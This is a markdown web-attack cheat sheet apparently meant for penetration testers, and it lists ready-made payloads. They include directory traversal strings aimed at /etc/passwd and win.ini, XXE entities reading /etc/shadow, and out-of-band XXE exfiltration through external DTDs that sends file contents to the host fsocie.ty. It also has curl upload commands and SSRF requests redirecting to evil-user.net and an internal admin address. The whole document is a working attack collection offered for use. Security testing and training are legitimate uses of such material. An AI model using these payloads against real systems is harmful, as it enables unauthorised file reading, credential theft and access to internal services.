<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Web Cheat Sheet
## Tags
    #@WEB  #@TODO

## Common OWASP & Portswigger Techniques

### Directory Traversal

  https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
  ....//
  ....\/
  ..\..\
  ..%c0%af
  ..%252f
  filename=/var/www/images/../../../etc/passwd
  filename=../../../etc/passwd%00.png 

### XML External Entity (XXE)

Example 1:
```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

#### Vanilla, use with Burp Collaborator to verify blind or OOB
```
<?xml version="1.0" ?>
<!DOCTYPE r [
  <!ELEMENT r ANY >
  <!ENTITY sp SYSTEM "http://fsocie.ty:443/test.txt">
]>
<r>&sp;</r>
```

#### OOB Extraction
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://fsocie.ty:443/ev.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```
External DTD:
```
<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://fsocie.ty:443/?%data;'>">
```

#### OOB Variation for .NET
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://fsocie.ty:443/ev.xml">
%sp;
%param1;
%exfil;
]>
```
External DTD:
```
<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://fsocie.ty:443/?%data;'>">
```

## Upload Files

curl
```
curl -u <username:password> -T file_to_upload <Target_URL>
curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" <Target_URL>
```

put.pl
```
put.pl -h target -r /remote_file_name -f local_file_name
```

## SSRF

/product/nextProduct?currentProductId=6&path=http://evil-user.net --> http://evil-user.net:
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
